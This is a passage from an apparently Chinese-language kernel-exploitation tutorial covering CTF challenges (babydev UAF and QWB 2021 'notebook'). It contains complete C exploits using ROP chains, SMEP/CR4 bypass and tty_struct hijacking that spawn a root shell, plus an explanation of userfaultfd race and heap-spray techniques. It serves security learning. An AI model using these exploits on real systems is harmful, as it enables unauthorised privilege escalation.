class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">0x20</span>], p = <span class="hljs-number">0</span>;<br>    rop[p++] = POP_RDI_RET;<br>    rop[p++] = <span class="hljs-number">0x6f0</span>;<br>    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = getRootPrivilige;<br>    rop[p++] = SWAPGS_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = IRETQ_RET;<br>    rop[p++] = getRootShell;<br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br>    <span class="hljs-keyword">size_t</span> fake_op[<span class="hljs-number">0x30</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;<br><br>    fake_op[<span class="hljs-number">0</span>] = POP_RAX_RET;<br>    fake_op[<span class="hljs-number">1</span>] = rop;<br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-keyword">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>    read(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br>    fake_tty[<span class="hljs-number">3</span>] = fake_op;<br>    write(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br><br>    write(fd3, buf, <span class="hljs-number">0x8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>本地打包，运行，成功提权到root</p><blockquote><p>这道题在当年的解法据悉是<strong>通过 UAF 修改该进程的 cred 结构体的 uid、gid 为0</strong>，十分简单十分白给</p><p>但是<strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong> </p><blockquote><p>来着内核源码 4.5 <code>kernel/cred.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __init <span class="hljs-title">cred_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(struct cred), <span class="hljs-number">0</span>,<br>            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>本题（4.4.72）：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __init <span class="hljs-title">cred_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>    cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(struct cred),<br>                     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure></blockquote><blockquote><p>既然现在新的保护机制都出来了，那笔者认为在学习 kernel UAF 的过程中忽视掉这一点便是<strong>自欺欺人</strong>（而且这个解法<strong>太弱智了，完全没有学的意义</strong> - - ），故这里便<strong>不再考虑</strong>以前旧的做法，感兴趣的参考如下exp：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// the child thread</span><br>    &#123;<br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// the parent thread</span><br>    &#123;<br>        wait(<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//waiting for the child</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></blockquote></blockquote><h1 id="内核堆喷-heap-spraying"><a href="#内核堆喷-heap-spraying" class="headerlink" title="内核堆喷(heap spraying)"></a>内核堆喷(heap spraying)</h1><p><strong>堆喷射</strong>（heap spraying）指的是一种辅助攻击手法：「<strong>通过大量的分配相同的结构体来达成某种特定的内存布局</strong>，从而帮助攻击者完成后续的利用过程」，常见于如下场景：</p><ul><li>你有一个 UAF，但是<strong>该 object 不属于当前 freelist ，释放后会回到 node 上</strong>，这时你可以通过堆喷射来确保拿到该 object</li><li>你有一个堆溢出，但是<strong>堆布局对你而言是不可知的</strong>（比如说开启了 <code>SLAB_FREELIST_RANDOM</code>（默认开启）），你可以预先喷射大量特定结构体，从而保证对其中某个结构体的溢出</li><li>……</li></ul><h2 id="例题：强网杯2021线上赛-notebook"><a href="#例题：强网杯2021线上赛-notebook" class="headerlink" title="例题：强网杯2021线上赛 - notebook"></a><em>例题：强网杯2021线上赛 - notebook</em></h2><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><p>首先看一下启动脚本（<del>写得很 tmd 乱，早该锤锤出题人了</del>）</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>stty intr ^]<br>exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s<br></code></pre></div></td></tr></table></figure><p>开了 smap、smep、kaslr 保护</p><p>查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code></p><p><a href="https://i.loli.net/2021/09/10/TuDM8B52agPXiI4.png"><img src="https://s2.loli.net/2023/02/06/MgqowIeJrQWcEhm.png" alt="image.png"></a></p><p>开启了 KPTI （内核页表隔离）</p><p>给了一个 LKM 叫 <code>notebook.ko</code>，按惯例这应当就是有漏洞的模块了，拖入 IDA 进行分析</p><p>大致是创建了一个 misc 类型的设备，并自定义了 ioctl、read、write 三个接口</p><p><a href="https://i.loli.net/2021/06/22/Ve8ifgAOLomTj4H.png"><img src="https://s2.loli.net/2023/02/06/sfwuprjn8bgJ37B.png" alt="image.png"></a></p><h4 id="1）note-结构体"><a href="#1）note-结构体" class="headerlink" title="1）note 结构体"></a>1）note 结构体</h4><p>定义了一个结构体 <code>note</code>，有着两个成员：size 存储 cache 的大小，buf 存储指向对应 cache 的指针</p><p><a href="https://i.loli.net/2021/06/22/eM1Dknsi8qPXIF7.png"><img src="https://s2.loli.net/2023/02/06/cLGKsM8TaSDRIfj.png" alt="image.png"></a></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125;note;<br></code></pre></div></td></tr></table></figure><h4 id="2）mynote-ioctl"><a href="#2）mynote-ioctl" class="headerlink" title="2）mynote_ioctl"></a>2）mynote_ioctl</h4><p>对于 ioctl 通信，该模块模拟了一个菜单（<del>又是菜单堆</del>），提供了创建、编辑、释放内存的功能</p><p><a href="https://i.loli.net/2021/06/22/ebcs7dqulX152fg.png"><img src="https://s2.loli.net/2023/02/06/bhZCpKUvViXzL9r.png" alt="image.png"></a></p><p>我们需要传入的参数为如下结构体：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125;userarg;<br></code></pre></div></td></tr></table></figure><h5 id="noteadd"><a href="#noteadd" class="headerlink" title="noteadd()"></a>noteadd()</h5><p>noteadd() 会向 slub 申请 object，其中限制了我们只能够分配 0x60 以下的 note，此时不会直接将用户数据拷贝到刚分配的 note 中，而是拷贝到全局变量字符数组 <code>name</code> 中</p><p><a href="https://i.loli.net/2021/06/22/6HVQLpBYk1S5EtK.png"><img src="https://s2.loli.net/2023/02/06/I9wg3d5K4mFRWPV.png" alt="image.png"></a></p><h5 id="notedel"><a href="#notedel" class="headerlink" title="notedel()"></a>notedel()</h5><p>这个函数主要用处是释放先前分配的 note</p><p>注意到在 notedel() 函数中若是 size 为 0 则不会清空，不过与 ptmalloc 所不同的是，kmalloc(0) 并不会返回 object</p><p>这里还有一个读写锁，不过 add 和 edit 占用的是<strong>读</strong>位，而 delete 占用的是<strong>写</strong>位，通俗地说便是：读锁可以被多个进程使用，多个进程此时可以同时进入临界区，而写锁只能被一个进程使用，只有一个进程能够进入临界区</p><p><a href="https://i.loli.net/2021/06/22/voBxLYPGEf9slDz.png"><img src="https://s2.loli.net/2023/02/06/piHZNTxkjOryE5o.png" alt="image.png"></a></p><h5 id="noteedit"><a href="#noteedit" class="headerlink" title="noteedit()"></a>noteedit()</h5><p>编辑我们的 notebook 中的 object，若是 size 不同则会调用 krealloc，并将用户空间数据拷贝 256 字节至全局变量 name 中，否则直接返回，与 add 所不同的是 edit 并不会限制 size 大小，因此<strong>虽然 add 限制了 size，但是通过 edit 我们仍能获得任意大小的 object</strong></p><p>在这里存在一个漏洞：edit 使用的是读锁，可以多个进程并发 <code>realloc(buf, 0)</code> ，通过条件竞争达到 double free 的效果</p><p><a href="https://i.loli.net/2021/07/31/2Q4vezhdZy61sAf.png"><img src="https://s2.loli.net/2023/02/06/4btxwPQWcn8srXT.png" alt="image.png"></a></p><h5 id="notegift"><a href="#notegift" class="headerlink" title="notegift()"></a>notegift()</h5><p>notegift() 函数会白给出分配的 note 的地址</p><p><a href="https://i.loli.net/2021/06/22/1eUIDfFAsaqyOmY.png"><img src="https://s2.loli.net/2023/02/06/k1ypdVtBboeSlha.png" alt="image.png"></a></p><h4 id="3）mynote-read"><a href="#3）mynote-read" class="headerlink" title="3）mynote_read"></a>3）mynote_read</h4><p>很普通的读取对应 note 内容的功能，读取的大小为 notebook 结构体数组中存的 size，下标为 read 传入的第三个参数</p><p><a href="https://i.loli.net/2021/06/22/m2XhBYuUbKVElH4.png"><img src="https://s2.loli.net/2023/02/06/Th1cKDv7JnyIx4Z.png" alt="image.png"></a></p><h4 id="4）mynote-write"><a href="#4）mynote-write" class="headerlink" title="4）mynote_write"></a>4）mynote_write</h4><p>很普通的写入对应 note 内容的功能，写入的大小为 notebook 结构体数组中存的 size，下标为 write 传入的第三个参数</p><p><a href="https://i.loli.net/2021/06/22/dMnI7hjfyQrZmC4.png"><img src="https://s2.loli.net/2023/02/06/5zpJaMri3Fb1xtB.png" alt="image.png"></a></p><h3 id="解法一：userfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass"><a href="#解法一：userfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass" class="headerlink" title="解法一：userfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass"></a>解法一：userfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass</h3><h4 id="1）userfaultfd-构造-UAF"><a href="#1）userfaultfd-构造-UAF" class="headerlink" title="1）userfaultfd 构造 UAF"></a>1）userfaultfd 构造 UAF</h4><p>考虑到在 mynote_edit 当中使用了 krealloc 来重分配 object，随后使用 copy_fom_user 从用户空间拷贝数据，那么这里我们可以先分配一个 tty_struct 大小的 note，之后<strong>新开 edit 线程通过 krealloc 一个较大的数将其释放</strong>，并通过 userfaultfd 让 mynote_edit 卡在这里，<strong>此时 notebook 数组中的 object 尚未被清空，仍是原先被释放了的 object</strong></p><p><a href="https://i.loli.net/2021/09/09/LMEmgrIGoUjwDJ2.png"><img src="https://s2.loli.net/2023/02/06/b4gY3VxPRstlXvJ.png" alt="image.png"></a></p><p>接下来我们进行<strong>堆喷射</strong>：多次打开 <code>/dev/ptmx</code>，由此我们便有可能<strong>将刚释放的 object 申请到 tty_struct 中</strong></p><p>但在 read 和 write 中都会用 <code>_check_object_size</code> 检查 size 与 buf 大小是否匹配，在 mynote_add 当中限制了 size 应当不大于 0x60，而我们在 mynote_edit 中的释放操作之前会将 size 改掉</p><p><a href="https://i.loli.net/2021/09/09/h7TiZGbxfuqOc2B.png"><img src="https://s2.loli.net/2023/02/06/iWfUJgS4cTPyYAp.png" alt="image.png"></a></p><p>考虑到在 mynote_add 中先用 copy_from_user 拷贝数据后才调用 kmalloc，故这里还是可以新开 add 线程让 size 合法后通过 userfaultfd 让其卡在这里</p><p><a href="https://i.loli.net/2021/09/09/J4m6VTr3kAwZoX8.png"><img src="https://s2.loli.net/2023/02/06/W7RvALhlrTnZbcx.png" alt="image.png"></a></p><blockquote><p>我们可以通过检查 object 开头的数据是否为 tty 魔数 <code>0x5401</code> 判断是否分配到了 tty_struct</p></blockquote><h4 id="2）泄露内核地址"><a href="#2）泄露内核地址" class="headerlink" title="2）泄露内核地址"></a>2）泄露内核地址</h4><p>由于我们已经获得了一个 tty_struct，故可以直接通过 tty_struct 中的 tty_operations 泄露地址</p><h5 id="ptm-unix98-ops-amp-amp-pty-unix98-ops"><a href="#ptm-unix98-ops-amp-amp-pty-unix98-ops" class="headerlink" title="ptm_unix98_ops &amp;&amp; pty_unix98_ops"></a>ptm_unix98_ops &amp;&amp; pty_unix98_ops</h5><p>在 ptmx 被打开时内核通过 <code>alloc_tty_struct()</code> 分配 tty_struct 的内存空间，之后会将 tty_operations 初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops </code>，因此我们可以通过 tty_operations 来泄露内核基址</p><blockquote><p>在调试阶段我们可以先关掉 kaslr 开 root 从 <code>/proc/kallsyms</code> 中读取其偏移</p></blockquote><p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 ptm_unix98_ops 还是 pty_unix98_ops</p><h4 id="3）劫持-tty-operations"><a href="#3）劫持-tty-operations" class="headerlink" title="3）劫持 tty_operations"></a>3）劫持 tty_operations</h4><p>由于题目开启了 smap 保护，我们不能够直接将 fake tty_operations 放置到用户空间当中，但 notegift() 会白给出 notebook 里存的 note 的地址，那么我们可以把 fake tty_operations 布置到 note 当中</p><p>接下来进行栈迁移的工作，我们这里考虑劫持 tty_operations-&gt;write，简单下个断点看看环境：</p><p><a href="https://i.loli.net/2021/09/09/VwIjzT4D7aNmuqZ.png"><img src="https://s2.loli.net/2023/02/06/R6OrzTpFMV5isKe.png" alt="image.png"></a></p><p>可以发现当程序运行到这里时 rdi 寄存器中存储的刚好是 tty_struct 的地址，笔者选择通过下面这条 gadget 将栈迁移到 tty_struct：</p><p><a href="https://i.loli.net/2021/09/09/Jkgyl5NnrPEjfiV.png"><img src="https://s2.loli.net/2023/02/06/vUQj85sMo9nptbE.png" alt="image.png"></a></p><p>tty_struct 比较小，而且很多数据不能动，这里笔者再进行第二次栈迁移迁回 tty_operations：</p><p><a href="https://i.loli.net/2021/09/09/R3bm6E8dzv5CayG.png"><img src="https://s2.loli.net/2023/02/06/UDp7EwLdkNWs4aJ.png" alt="image.png"></a></p><p>tty_operation 开头到 write 的空间比较小，笔者选择再进行第三次栈迁移到一个 note 中，在那里完成我们的 ROP</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// first migration to tty_struct</span><br>((struct tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br><span class="hljs-comment">// second migration back to tty_operations</span><br>fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br><span class="hljs-comment">// third migration to a note</span><br>fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br></code></pre></div></td></tr></table></figure><h4 